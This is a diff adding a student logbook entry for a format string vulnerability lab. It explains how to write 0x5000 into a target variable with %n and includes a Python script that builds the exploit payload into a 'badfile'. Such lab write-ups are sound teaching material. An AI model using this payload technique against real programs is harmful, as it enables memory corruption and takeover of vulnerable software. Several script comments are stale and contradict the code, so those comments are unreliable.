@@ -310,8 +310,59 @@ And that worked as seen in Figure 10.
 
 ### Task 3.B
 
-?????????????
+In this sub-task, we need to change the content of the target variable to a specific value 0x5000.
 
-## Question 2
+To chane the value of the target variable to this specific number (0x5000), we need, theoricaly, to print 20480 characters before the `%n`
 
-documentação
+Since our content comes in the 64th position in the stack, this is equivalent to `63 * 8 = 504` characteres that we always need to print so we need to put print more `20480 - 504 = 19976`. This was what makes sense to do.
+
+For us this doesn't works so we have need to discover the number that we need to print before the `%n` basically by (try and error). We also discover that when we put some `%.x` before the expression to change the value of the target variable our content pass to the 62 position.
+
+After this we finally discover how to change the value of the variable to `0x5000` by using this script
+
+```python
+#!/usr/bin/python3
+
+import sys
+
+# Initialize the content array
+
+N = 1500
+
+content = bytearray(0x0 for i in range(N))
+
+# This line shows how to store a 4-byte integer at offset 0
+
+number  = 0x080e5068
+
+content[0:4] = (number).to_bytes(4, byteorder="little")
+
+# This line shows how to construct a string s with
+
+#   12 of "%.8x", concatenated with a "%n"
+
+s = "%.20252x" + "%x" * 62 + "%n"
+
+# The line shows how to store the string s at offset 8
+
+fmt  = (s).encode('latin-1')
+
+content[4 : len(fmt)] = fmt
+
+# Write the content to badfile
+
+with open('badfile', 'wb') as f:
+
+  f.write(content)
+```
+
+This script is identical to the one done in the previous subtask (3.A) except the expression `%.20252x + %x * 62 + %n` that has a little changes compared to the previous one used.
+
+and that works as seen in Figure 11
+
+<div align="center">
+    <figure>
+        <img src="images/logbook6/logbook6_11.png">
+        <figcaption style="font-size: smaller">Figure 11: Target variable changed to 0x5000.</figcaption>
+    </figure>
+</div>
